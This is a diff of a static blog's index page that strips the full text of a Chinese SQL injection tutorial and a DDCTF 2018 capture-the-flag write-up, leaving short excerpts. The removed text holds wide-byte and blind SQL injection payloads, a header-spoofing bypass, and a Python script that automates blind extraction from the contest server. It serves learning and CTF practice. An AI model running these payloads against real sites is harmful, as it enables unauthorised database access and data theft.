@@ -403,148 +403,17 @@
 
       
         
-          
-            <h1 id="一、SQL注入"><a href="#一、SQL注入" class="headerlink" title="一、SQL注入"></a>一、SQL注入</h1><ul>
+          <h1 id="一、SQL注入"><a href="#一、SQL注入" class="headerlink" title="一、SQL注入"></a>一、SQL注入</h1><ul>
 <li><h5 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h5></li>
 </ul>
-<p>&emsp;&emsp;宽字节注入原理：</p>
-<p>&emsp;&emsp;<strong><code>GBK</code> 占用两字节，<code>ASCII</code>占用一字节。PHP中编码为<code>GBK</code>，函数执行添加的是<code>ASCII编码</code>，MYSQL默认字符集是<code>GBK</code>等宽字节字符集。</strong></p>
-<p>&emsp;&emsp;在客户端输入字符<code>&#39;</code>被PHP转义成<code>\&#39;</code>，<code>\&#39;</code>编码是<code>%5c%27</code>。</p>
-<p>&emsp;&emsp;如果注入的时候在<code>&#39;</code>前面加上<code>%df</code>字符变成<code>%df&#39;</code>，经过转义之后变成<code>%df%5c%27</code>，而之前说了MYSQL默认的是<code>GBK</code>等宽字节字符集，<code>GBK</code>编码格式会把本来属于<code>ascii</code>编码的字符‘吃掉’，会将<code>%df%5c</code>编码成<code>運</code>，所以会将<code>%df%5c%27</code>编码成<code>運&#39;</code>。</p>
-<p>&emsp;&emsp;于是就可以继续愉快的注入了。</p>
-<p>&emsp;&emsp;<strong>注：</strong> </p>
-<p>&emsp;&emsp;&emsp;&emsp;1.宽字节注入与HTML页面编码是无关的，在<code>&lt;meta charset=utf8&gt;</code>情况下一样有可能进行宽字节注入。</p>
-<p>&emsp;&emsp;&emsp;&emsp;2.宽字节注入不一定只有<code>GBK</code>编码，宽字节编码都有可能可以进行宽字节注入。</p>
-<p>&emsp;&emsp;<strong>例：</strong></p>
-<p>&emsp;&emsp;BugkuCTF–sql注入:<a href="http://103.238.227.13:10083/" target="_blank" rel="noopener">http://103.238.227.13:10083/</a></p>
-<p>&emsp;&emsp;使用<code>&#39;</code>没有反应，于是猜测是宽字节注入。</p>
-<p>&emsp;&emsp;这道题里面还有一个知识点（keng）就是<code>key</code>是MYSQL的关键字，直接使用会报错。MYSQL提供了一个转义符号 &#96; 来区别关键词和库表字段名。</p>
-<pre><code>id=1%df%27%20union%20select%200,string%20from%20`key`%23
-id=1%df&apos; union select 0,string from `key`#
-</code></pre><hr>
-<ul>
-<li><h4 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h4></li>
-</ul>
-<p>&emsp;&emsp;盲注应用于存在SQL注入漏洞，但是页面没有显示报错信息，或者网站过滤了部分特定字段，如<code>union</code>。盲注可以通过页面返回信息的正确与否判断语句是否正确。</p>
-<p>&emsp;&emsp;盲注分为两种：布尔和延时盲注。</p>
-<p>&emsp;&emsp;常用函数：</p>
-<pre><code>Length()        返回字符串的长度
-limit num,num   限制返回数据条数
-Substr()        截取字符串
-Ascii()         返回字符的ascii码
-sleep(n)        将程序挂起一段时间 n为n秒
-if(expr1,expr2,expr3)
-                判断语句 如果第一个语句正确就执行第二个语句如果错误执行第三个语句
-</code></pre><p>&emsp;&emsp;构造语句：</p>
-<pre><code>## 布尔盲注：
-AND SELECT SUBSTR(table_name,1,1) FROM information_schema.tables &gt; &apos;A&apos; ## 表名
-AND SELECT SUBSTR(column_name,1,1) FROM information_schema.columns &gt; &apos;A&apos; ## 列名
-
-1&apos; and (ascii(substr(database(),1,1)))=115 --+
-1&apos; and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)))&gt;100 --+
-
-## 延时盲注：
-1&apos; and (if(ascii(substr(database(),1,1))&gt;100,sleep(10),null))  --+ 
-</code></pre><p>&emsp;&emsp;<strong>例：</strong></p>
-<p>&emsp;&emsp;DDCTF-2018–数据库的秘密：<a href="http://116.85.43.88:8080/ZVDHKBUVUZSTJCNX/dfe3ia/index.php" target="_blank" rel="noopener">http://116.85.43.88:8080/ZVDHKBUVUZSTJCNX/dfe3ia/index.php</a></p>
-<p>&emsp;&emsp;<a href="https://hwhehr.github.io/2018/04/21/DDCTF-2018/" target="_blank" rel="noopener">数据库的秘密</a></p>
-<hr>
-<p>未完待续。。。</p>
-<hr>
-<ul>
-<li>布尔注入</li>
-<li>联合查询注入</li>
-<li>时间延时注入</li>
-<li>报错注入</li>
-<li>多语句注入</li>
-</ul>
-<hr>
-<h5 id="SQL注入资料"><a href="#SQL注入资料" class="headerlink" title="SQL注入资料"></a>SQL注入资料</h5><table>
-<thead>
-<tr>
-<th>常见参数</th>
-<th>用途      </th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>user()</td>
-<td>当前数据库用户名</td>
-</tr>
-<tr>
-<td>database()</td>
-<td>当前数据库名</td>
-</tr>
-<tr>
-<td>version()</td>
-<td>当前使用数据库版本</td>
-</tr>
-<tr>
-<td>@@datadir</td>
-<td>数据库储存路径</td>
-</tr>
-</tbody>
-</table>
-<table>
-<thead>
-<tr>
-<th>常用函数</th>
-<th>用途</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>ascii(str)</td>
-<td>将字符转换为ascii</td>
-</tr>
-<tr>
-<td>char(num)</td>
-<td>将数字转换为字符</td>
-</tr>
-<tr>
-<td>substr(str,num,num)</td>
-<td>切割字符串</td>
-</tr>
-<tr>
-<td>limit num,num</td>
-<td>限制输出查询条数</td>
-</tr>
-<tr>
-<td>concat(str,str…)</td>
-<td>联合数据，用于联合两条数据</td>
-</tr>
-<tr>
-<td>sleep(num)</td>
-<td>延时</td>
-</tr>
-<tr>
-<td>count(*)</td>
-<td>返回数据条数</td>
-</tr>
-<tr>
-<td>group_concat()</td>
-<td>与concat()类似</td>
-</tr>
-<tr>
-<td>concat_ws()</td>
-<td>与concat()类似</td>
-</tr>
-<tr>
-<td>hex() / unhex()</td>
-<td>用于hex编码解码</td>
-</tr>
-<tr>
-<td>load_file()</td>
-<td>以文本方式读取文件</td>
-</tr>
-<tr>
-<td>select xxoo into outfile path</td>
-<td>权限高时可直接写文件</td>
-</tr>
-</tbody>
-</table>
-
-          
+<p>&emsp;&emsp;宽字节注入原理：<br></p>
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2018/04/22/SQLInjectionAttack/#more" rel="contents">
+              Read more &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -694,53 +563,15 @@ AND SELECT SUBSTR(column_name,1,1) FROM information_schema.columns &gt; &apos;A&
 
       
         
-          
-            <p>&emsp;&emsp;这次的DDCTF可以说是我的第一次真正意义上的CTF比赛，虽然题没有做出来几个。但是还是学到不少其他东西。</p>
-<p>&emsp;&emsp;这是这次比赛第一的大佬的博客：<a href="https://blog.csdn.net/whklhhhh" target="_blank" rel="noopener">奈沙夜影</a>，大佬的博客是从2016年10月1日开始写，一直到今天，536天，里面是每天的的学习进度，学习重点和学习计划。可以从他的前几个博客看出，在当时我们几乎是在同一个起跑线上的————SQL注入的select，order by语句和C++入门，而现在他已经成为了逆向大佬，看看现在我们现在的差距，真的是把我震惊的体无完肤。</p>
-<p>&emsp;&emsp;这可以说是我这次比赛的最大的收获了吧。</p>
-<hr>
-<h3 id="Web1-数据库的秘密"><a href="#Web1-数据库的秘密" class="headerlink" title="Web1 数据库的秘密"></a>Web1 数据库的秘密</h3><p><a href="http://116.85.43.88:8080/ZVDHKBUVUZSTJCNX/dfe3ia/index.php" target="_blank" rel="noopener">http://116.85.43.88:8080/ZVDHKBUVUZSTJCNX/dfe3ia/index.php</a></p>
-<p><img src="/2018/04/21/DDCTF-2018/1.png" alt="image" title="非法链接，只允许来自 123.232.23.245 的访问"></p>
-<p>&emsp;&emsp;这是一个HTTP请求头的限制，可以通过浏览器的插件添加<code>X-Forwarded-For</code>请求头。工具：<strong>Header Editor</strong></p>
-<blockquote>
-<p>X-Forwarded-For:123.232.23.245</p>
-</blockquote>
-<p>&emsp;&emsp;明显是个注入题，在尝试了前3个输入框无果后，查看源码，发现了代码中的隐藏字段，去掉<code>hidden</code>，发现可以注入，开始注入。</p>
-<p><img src="/2018/04/21/DDCTF-2018/2.png" alt="image"></p>
-<p>&emsp;&emsp;在常规测试之后发现网站的WAF过滤了这几个字符: <code>=</code> <code>union select</code> <code>and</code></p>
-<p>&emsp;&emsp;在尝试了许久将<code>union select</code>字段转义成各种其他表示方法后，发现是可以盲注的。</p>
-<p>&emsp;&emsp;于是可以构造语句：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">admin&apos; &amp;&amp; (ascii(substr((select table_schema from information_schema.tables limit %d,1),%d,1))) &gt; %d ##</span><br><span class="line">## 爆库名</span><br><span class="line">admin&apos; &amp;&amp; (ascii(substr((select table_name from information_schema.tables where table_schema=&apos;库名&apos; limit %d,1),%d,1))) &gt; %d ##</span><br><span class="line">## 爆表名</span><br><span class="line">admin&apos; &amp;&amp; (ascii(substr((select column_name from information_schema.columns where table_name=&apos;表名&apos; limit %d,1),%d,1))) &gt; %d ##</span><br><span class="line">## 爆字段名</span><br><span class="line">admin’ &amp;&amp; (ascii(substr((select secvalue from ctf_key7 limit %d,1),%d,1)))&gt; %d ##</span><br><span class="line">## 猜解出flag</span><br></pre></td></tr></table></figure></p>
-<p>&emsp;&emsp;然后发现了一个问题是，在提交答案的过程中，网页是吧提交的数据经过加密后生成了一个<code>sig</code>值，进行后台的数据验证，网页的js脚本也做了混淆，导致了不能直接用脚本跑。</p>
-<p><img src="/2018/04/21/DDCTF-2018/3.png" alt="image"></p>
-<p>&emsp;&emsp;通过查资料发现这算是CTF的一种常见的js混淆方法，直接将脚本前面的<code>eval</code>(执行js脚本)改写成<code>alert</code>，添上<code>script</code>标签浏览器就可以直接将原代码给alert出来。（还是题做少了）</p>
-<p><img src="/2018/04/21/DDCTF-2018/4.png" alt="image"></p>
-<p>&emsp;&emsp;知道了加密方式就可以开始写脚本跑了</p>
-<p>&emsp;&emsp;代码没有什么借鉴价值，猜解完全可以用二分法来猜解，为了开发效率（因为懒），所以直接牺牲了运行时间。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> execjs</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">f = open(<span class="string">'/Users/chuck/Desktop/math.js'</span>,<span class="string">'r'</span>)</span><br><span class="line">code = f.read()</span><br><span class="line">code = code.replace(<span class="string">'\n'</span>,<span class="string">''</span>)</span><br><span class="line">f.close()</span><br><span class="line">node = execjs.get()</span><br><span class="line">context = node.compile(code)</span><br><span class="line"></span><br><span class="line">ascii_list = [<span class="number">48</span>, <span class="number">49</span>, <span class="number">50</span>, <span class="number">51</span>, <span class="number">52</span>, <span class="number">53</span>, <span class="number">54</span>, <span class="number">55</span>, <span class="number">56</span>, <span class="number">57</span>, <span class="number">65</span>, <span class="number">66</span>, <span class="number">67</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">70</span>, <span class="number">71</span>, <span class="number">72</span>, <span class="number">73</span>, <span class="number">74</span>, <span class="number">75</span>, <span class="number">76</span>, <span class="number">77</span>, <span class="number">78</span>, <span class="number">79</span>, <span class="number">80</span>, <span class="number">81</span>, <span class="number">82</span>, <span class="number">83</span>, <span class="number">84</span>, <span class="number">85</span>, <span class="number">86</span>, <span class="number">87</span>, <span class="number">88</span>, <span class="number">89</span>, <span class="number">90</span>, <span class="number">95</span>, <span class="number">97</span>, <span class="number">98</span>, <span class="number">99</span>, <span class="number">100</span>, <span class="number">101</span>, <span class="number">102</span>, <span class="number">103</span>, <span class="number">104</span>, <span class="number">105</span>, <span class="number">106</span>, <span class="number">107</span>, <span class="number">108</span>, <span class="number">109</span>, <span class="number">110</span>, <span class="number">111</span>, <span class="number">112</span>, <span class="number">113</span>, <span class="number">114</span>, <span class="number">115</span>, <span class="number">116</span>, <span class="number">117</span>, <span class="number">118</span>, <span class="number">119</span>, <span class="number">120</span>, <span class="number">121</span>, <span class="number">122</span>,<span class="number">123</span>,<span class="number">125</span>]</span><br><span class="line"></span><br><span class="line">s1 = <span class="string">'admin\' &amp;&amp; (ascii(substr((select secvalue from ctf_key9 limit %d,1),%d,1))) %s %d ##'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_page</span><span class="params">(sig,t,author)</span>:</span></span><br><span class="line">    url = <span class="string">'http://116.85.43.88:8080/NQYPTEMNWRQIYLEP/dfe3ia/index.php?sig='</span> + sig + <span class="string">'&amp;time='</span> + t</span><br><span class="line">    proxies = &#123;</span><br><span class="line">        <span class="string">'http'</span>: <span class="string">'http://127.0.0.1:8080'</span>,</span><br><span class="line">        <span class="string">'https'</span>: <span class="string">'https://127.0.0.1:8080'</span></span><br><span class="line">    &#125;</span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">"User-Agent"</span>:<span class="string">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:59.0) Gecko/20100101 Firefox/59.0"</span>,</span><br><span class="line">        <span class="string">"Accept"</span>:<span class="string">"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"</span>,</span><br><span class="line">        <span class="string">"Accept-Language"</span>:<span class="string">"en-US,en;q=0.5"</span>,</span><br><span class="line">        <span class="string">"Accept-Encoding"</span>:<span class="string">"gzip, deflate"</span>,</span><br><span class="line">        <span class="string">"Referer"</span>:<span class="string">"http://116.85.43.88:8080/NQYPTEMNWRQIYLEP/dfe3ia/index.php"</span>,</span><br><span class="line">        <span class="string">"Content-Type"</span>:<span class="string">"application/x-www-form-urlencoded"</span>,</span><br><span class="line">        <span class="string">"Connection"</span>:<span class="string">"close"</span>,</span><br><span class="line">        <span class="string">"Upgrade-Insecure-Requests"</span>:<span class="string">"1"</span>,</span><br><span class="line">        <span class="string">"X-Forwarded-For"</span>:<span class="string">"123.232.23.245"</span></span><br><span class="line">    &#125;</span><br><span class="line">    data = &#123;<span class="string">'id'</span> : <span class="string">''</span>, <span class="string">'title'</span> : <span class="string">''</span>, <span class="string">'author'</span> : author, <span class="string">'date'</span> : <span class="string">''</span>, <span class="string">'button'</span> : <span class="string">'search'</span>&#125;</span><br><span class="line">    page = requests.post(url,proxies=proxies,headers=headers,verify=<span class="keyword">False</span>,data=data)</span><br><span class="line">    text = page.text</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'title1'</span> <span class="keyword">in</span> text</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">jiami</span><span class="params">(author)</span>:</span></span><br><span class="line">    t = str(int(time.time()))</span><br><span class="line">    sig = context.call(<span class="string">"hex_math_enc"</span>,<span class="string">'id=title=author='</span> + author + <span class="string">'date=time='</span> + t + <span class="string">'adrefkfweodfsdpiru'</span>)</span><br><span class="line">    <span class="keyword">return</span> get_page(sig,t,author)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">for</span> biao_num <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">200</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> jiami(s1 % (biao_num,<span class="number">1</span>,<span class="string">'&gt;'</span>,<span class="number">0</span>)):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        name = <span class="string">''</span></span><br><span class="line">        <span class="keyword">for</span> biao_str <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">200</span>):</span><br><span class="line">            BOOL = <span class="keyword">False</span></span><br><span class="line">            <span class="keyword">for</span> rank <span class="keyword">in</span> ascii_list:</span><br><span class="line">                <span class="keyword">if</span> jiami(s1 % (biao_num,biao_str, <span class="string">'like'</span> ,rank)):</span><br><span class="line">                    name += chr(rank)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">if</span> rank == <span class="number">125</span>:</span><br><span class="line">                    BOOL = <span class="keyword">True</span></span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> BOOL:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">print</span> biao_num,<span class="string">':'</span>,name</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
-<p>&emsp;&emsp;web就只做出来一道。。。太菜了。</p>
-<h3 id="杂项2-emsp-╯°□°）╯︵-┻━┻"><a href="#杂项2-emsp-╯°□°）╯︵-┻━┻" class="headerlink" title="杂项2&emsp;(╯°□°）╯︵ ┻━┻"></a>杂项2&emsp;(╯°□°）╯︵ ┻━┻</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">d4e8e1f4a0f7e1f3a0e6e1f3f4a1a0d4e8e5a0e6ece1e7a0e9f3baa0c4c4c3d4c6fbb9e1b2e2e5e2b5b4e4b8b7e6e1e1b6b9e4b5e3b8b1b1e3e5b5b6b4b1b0e4e6b2fd</span><br></pre></td></tr></table></figure>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="string">'d4e8e1f4a0f7e1f3a0e6e1f3f4a1a0d4e8e5a0e6ece1e7a0e9f3baa0c4c4c3d4c6fbb9e1b2e2e5e2b5b4e4b8b7e6e1e1b6b9e4b5e3b8b1b1e3e5b5b6b4b1b0e4e6b2fd'</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">50</span>,<span class="number">150</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(len(s)/<span class="number">2</span>):</span><br><span class="line">        <span class="keyword">print</span> chr(int(s[j*<span class="number">2</span>]+s[(j*<span class="number">2</span>)+<span class="number">1</span>],<span class="number">16</span>)-i),</span><br><span class="line">    <span class="keyword">print</span></span><br></pre></td></tr></table></figure>
-<p>&emsp;&emsp;可以找到里面最顺眼的那一个</p>
-<blockquote>
-<p>That was fast! The flag is: DDCTF{9a2beb54d87faa69d5c811ce56410df2}</p>
-</blockquote>
-<h3 id="杂项3-emsp-第四扩展FS"><a href="#杂项3-emsp-第四扩展FS" class="headerlink" title="杂项3&emsp;第四扩展FS"></a>杂项3&emsp;第四扩展FS</h3><p><img src="/2018/04/21/DDCTF-2018/5.jpg" alt="image"></p>
-<p>&emsp;&emsp;是一个隐写术的题，放入<code>binwalk</code>下分析可以看出图片中还有一个<code>.zip</code>文件</p>
-<blockquote>
-<p>binwalk -e 5.jpg</p>
-</blockquote>
-<p>&emsp;&emsp;分解出来压缩文件是加了密的，找了很久密码在哪，最后拿到window下，图片的属性就是密码。。。（Mac）</p>
-<p>&emsp;&emsp;最后得到file.txt文件，进行词频统计，由高到低，就是flag。</p>
-<h3 id="杂项4-emsp-流量分析"><a href="#杂项4-emsp-流量分析" class="headerlink" title="杂项4&emsp;流量分析"></a>杂项4&emsp;流量分析</h3><p><a href="http://ddctf.didichuxing.com/files/23c7f7b38b3f92b7936740a301ffe28c/4ktdIvuSrUBb1ZD7Mqy96.pcap" target="_blank" rel="noopener">流量分析.pcap</a></p>
-<p>&emsp;&emsp;由于不想还原场景，就如此口述。</p>
-<p>&emsp;&emsp;放入<code>Wireshark</code>中查找几个关键字，<code>flag</code> <code>key</code> <code>ddctf</code> ，最后看到有一段<code>base64</code>文在其中。解密后是一张图片，图片是里一段神似<code>base64</code>的字符。识别下来，并经过一个一个比对后，得到这段字符，无法进行解密。</p>
-<p>&emsp;&emsp;最后同学说这是<code>HTTPS/SSL</code>通信的密钥，题目上也有提示的。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">提示二：注意补齐私钥格式</span><br><span class="line">-----BEGIN RSA PRIVATE KEY-----</span><br><span class="line">XXXXXXX</span><br><span class="line">-----END RSA PRIVATE KEY-----</span><br></pre></td></tr></table></figure></p>
-<p>&emsp;&emsp;将密钥格式加上，用<code>Wireshark</code>导入后，将几条加密的流量解密后直接可以看到<code>flag</code></p>
-<hr>
-<p>&emsp;&emsp;就做出来以上4道题，可以说菜的可以。大学要两年，从前段到后端，安全到开发，web到逆向，都接触过，但都没有深学下去，到头来啥也不会，也是服了自己了。</p>
-<p>&emsp;&emsp;过两天把剩下的题，看着大佬们的wp做出来后，再来总结。</p>
-
-          
+          <p>&emsp;&emsp;这次的DDCTF可以说是我的第一次真正意义上的CTF比赛，虽然题没有做出来几个。但是还是学到不少其他东西。</p>
+<p>&emsp;&emsp;这是这次比赛第一的大佬的博客：<a href="https://blog.csdn.net/whklhhhh" target="_blank" rel="noopener">奈沙夜影</a>，大佬的博客是从2016年10月1日开始写，一直到今天，536天，里面是每天的的学习进度，学习重点和学习计划。可以从他的前几个博客看出，在当时我们几乎是在同一个起跑线上的————SQL注入的select，order by语句和C++入门，而现在他已经成为了逆向大佬，看看现在我们现在的差距，真的是把我震惊的体无完肤。<br></p>
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2018/04/21/DDCTF-2018/#more" rel="contents">
+              Read more &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -857,9 +688,14 @@ AND SELECT SUBSTR(column_name,1,1) FROM information_schema.columns &gt; &apos;A&
 
       
         
-          
-            <h4 id="Hello-world"><a href="#Hello-world" class="headerlink" title="Hello world"></a>Hello world</h4>
-          
+          <h4 id="Hello-world"><a href="#Hello-world" class="headerlink" title="Hello world"></a>Hello world</h4>
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2018/04/21/hello world/#more" rel="contents">
+              Read more &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
